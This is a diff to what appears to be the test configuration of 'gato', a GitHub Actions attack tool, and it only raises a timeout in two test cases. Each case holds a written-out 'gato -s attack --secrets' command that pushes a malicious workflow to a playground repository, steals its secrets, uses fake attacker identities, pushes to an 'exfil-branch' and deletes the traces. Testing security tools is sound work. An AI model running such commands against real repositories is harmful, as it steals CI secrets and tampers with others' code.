@@ -342,7 +342,7 @@
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
-        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman --author-email hacker@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60",
+        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman --author-email hacker@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 300",
         "assertions": [
             {
                 "expect": "The malicious workflow executed succesfully!",
@@ -361,7 +361,7 @@
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
-        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman2 --author-email hacker2@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60 -b exfil-branch",
+        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman2 --author-email hacker2@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 300 -b exfil-branch",
         "assertions": [
             {
                 "expect": "The malicious workflow executed succesfully!",
